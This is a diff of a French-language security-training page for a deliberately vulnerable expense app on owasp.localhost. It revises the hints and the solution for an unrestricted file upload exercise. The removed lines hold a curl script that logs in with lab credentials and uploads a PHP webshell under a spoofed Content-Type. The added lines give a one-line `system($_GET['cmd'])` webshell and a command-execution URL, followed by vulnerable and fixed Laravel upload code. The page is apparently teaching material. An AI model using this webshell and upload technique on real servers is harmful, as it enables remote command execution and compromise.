@@ -69,7 +69,7 @@
                     Révéler l'indice
                 </summary>
                 <div class="px-4 py-3 bg-amber-50 border-t border-amber-200 space-y-1.5">
-                    <p class="text-sm text-amber-800">• Quel composant fournit le type MIME lors d'un upload : le serveur ou le navigateur ? Peut-on le falsifier avec un outil comme Burp Suite ou curl ?</p>
+                    <p class="text-sm text-amber-800">• L'application vérifie-t-elle l'extension du fichier uploadé ? Que se passe-t-il si vous uploadez un fichier <span class="font-mono bg-amber-100 px-1 rounded">.php</span> ?</p>
                     <p class="text-sm text-amber-800">• Le nom du fichier est-il transformé (UUID, hash) avant d'être enregistré sur le disque, ou est-il conservé tel quel ?</p>
                     <p class="text-sm text-amber-800">• Regardez l'URL du lien "Ouvrir" après l'upload : dans quel répertoire le fichier est-il stocké ? Ce répertoire est-il accessible publiquement ?</p>
                 </div>
@@ -86,52 +86,30 @@
                 <div class="px-4 py-4 bg-green-50 border-t border-green-200 space-y-4">
 
                     <div>
-                        <p class="text-xs font-semibold text-green-800 uppercase tracking-wider mb-2">Payload d'exploit</p>
-                        <p class="text-sm text-green-700 mb-2">
-                            Créer un fichier <span class="font-mono bg-white px-1.5 py-0.5 rounded border border-green-200 text-xs">shell.php</span>
-                            contenant <span class="font-mono bg-white px-1.5 py-0.5 rounded border border-green-200 text-xs">&lt;?php system($_GET['cmd']); ?&gt;</span>,
-                            puis envoyer la requête en falsifiant le Content-Type :
-                        </p>
-                        <pre class="bg-gray-900 text-gray-100 rounded-lg p-4 text-xs overflow-x-auto leading-relaxed"><code><span class="text-gray-500"># Récupérer le token CSRF et les cookies de session</span>
-TOKEN=$(curl -sc /tmp/cookies https://owasp.localhost/login | \
-  grep -oP 'name="_token" value="\K[^"]+')
-
-<span class="text-gray-500"># S'authentifier en tant qu'Alice</span>
-curl -sb /tmp/cookies -c /tmp/cookies -s -o /dev/null \
-  -X POST https://owasp.localhost/login \
-  -d "email=alice%40expensecorp.local&password=alice123&_token=$TOKEN"
-
-<span class="text-gray-500"># Créer une note de frais et noter son ID dans l'URL de redirection</span>
-<span class="text-gray-500"># Ex. https://owasp.localhost/expenses/1</span>
-
-<span class="text-gray-500"># Uploader le webshell en falsifiant le Content-Type</span>
-CSRF=$(curl -sb /tmp/cookies https://owasp.localhost/expenses/1 | \
-  grep -oP 'name="_token" value="\K[^"]+')
-
-curl -sb /tmp/cookies -c /tmp/cookies \
-  -X POST https://owasp.localhost/expenses/1/attachments \
-  -F "_token=$CSRF" \
-  -F "file=@shell.php;type=image/jpeg;filename=shell.php"
-
-<span class="text-gray-500"># Exécuter des commandes</span>
-curl https://owasp.localhost/uploads/shell.php?cmd=id
+                        <p class="text-xs font-semibold text-green-800 uppercase tracking-wider mb-2">Exploit</p>
+                        <ol class="text-sm text-green-700 space-y-1 list-decimal list-inside mb-3">
+                            <li>Créer un fichier <span class="font-mono bg-white px-1.5 py-0.5 rounded border border-green-200 text-xs">shell.php</span> contenant :</li>
+                        </ol>
+                        <pre class="bg-gray-900 text-gray-100 rounded-lg p-3 text-xs overflow-x-auto mb-3"><code><span class="text-blue-300">&lt;?php</span> system(<span class="text-yellow-300">$_GET</span>[<span class="text-green-300">'cmd'</span>]);</code></pre>
+                        <ol class="text-sm text-green-700 space-y-1 list-decimal list-inside" start="2">
+                            <li>L'uploader comme justificatif depuis le formulaire de l'application.</li>
+                            <li>Accéder à l'URL du fichier uploadé avec le paramètre <span class="font-mono bg-white px-1.5 py-0.5 rounded border border-green-200 text-xs">?cmd=id</span> :</li>
+                        </ol>
+                        <pre class="bg-gray-900 text-gray-100 rounded-lg p-3 text-xs overflow-x-auto mt-3"><code>/uploads/shell.php?cmd=id
 <span class="text-green-400"># uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre>
                     </div>
 
                     <div>
                         <p class="text-xs font-semibold text-green-800 uppercase tracking-wider mb-2">Code vulnérable &rarr; corrigé</p>
-                        <pre class="bg-gray-900 text-gray-100 rounded-lg p-4 text-xs overflow-x-auto leading-relaxed"><code><span class="text-red-400">// ❌ VULNÉRABLE — AttachmentController::store()</span>
+                        <pre class="bg-gray-900 text-gray-100 rounded-lg p-4 text-xs overflow-x-auto leading-relaxed"><code><span class="text-red-400">// ❌ VULNÉRABLE : AttachmentController::store()</span>
 
 <span class="text-gray-500">// Erreur 1 : validation sans restriction de type ni de taille</span>
 $request->validate([<span class="text-yellow-300">'file'</span> => [<span class="text-green-300">'required'</span>, <span class="text-green-300">'file'</span>]]);
 
-<span class="text-gray-500">// Erreur 2 : MIME type fourni par le navigateur (falsifiable)</span>
-<span class="text-yellow-300">$mimeType</span> = <span class="text-yellow-300">$file</span>->getClientMimeType();
-
-<span class="text-gray-500">// Erreur 3 : nom original conservé ("shell.php" passe tel quel)</span>
+<span class="text-gray-500">// Erreur 2 : nom original conservé ("shell.php" passe tel quel)</span>
 <span class="text-yellow-300">$originalName</span> = <span class="text-yellow-300">$file</span>->getClientOriginalName();
 
-<span class="text-gray-500">// Erreur 4 : stockage dans public/uploads/ (accessible via URL)</span>
+<span class="text-gray-500">// Erreur 3 : stockage dans public/uploads/ (accessible via URL)</span>
 <span class="text-yellow-300">$file</span>->move(public_path(<span class="text-green-300">'uploads'</span>), <span class="text-yellow-300">$originalName</span>);
 
 
@@ -144,13 +122,10 @@ $request->validate([<span class="text-yellow-300">'file'</span> => [
     <span class="text-green-300">'mimes:jpeg,png,pdf'</span>,   <span class="text-gray-500">// vérification par magic bytes</span>
 ]]);
 
-<span class="text-gray-500">// Règle 2 : vérification du MIME type réel (double sécurité)</span>
-<span class="text-yellow-300">$realMime</span> = <span class="text-yellow-300">$file</span>->getMimeType(); <span class="text-gray-500">// magic bytes, pas la déclaration client</span>
-
-<span class="text-gray-500">// Règle 3 : nom aléatoire — le nom original est ignoré</span>
+<span class="text-gray-500">// Règle 2 : nom aléatoire : le nom original est ignoré</span>
 <span class="text-yellow-300">$safeName</span> = Str::random(<span class="text-blue-300">32</span>) . <span class="text-green-300">'.'</span> . <span class="text-yellow-300">$file</span>->extension();
 
-<span class="text-gray-500">// Règle 4 : stockage hors du répertoire public (disk 'private')</span>
+<span class="text-gray-500">// Règle 3 : stockage hors du répertoire public (disk 'private')</span>
 <span class="text-yellow-300">$file</span>->storeAs(<span class="text-green-300">'uploads'</span>, <span class="text-yellow-300">$safeName</span>, disk: <span class="text-green-300">'private'</span>);</code></pre>
                     </div>
 
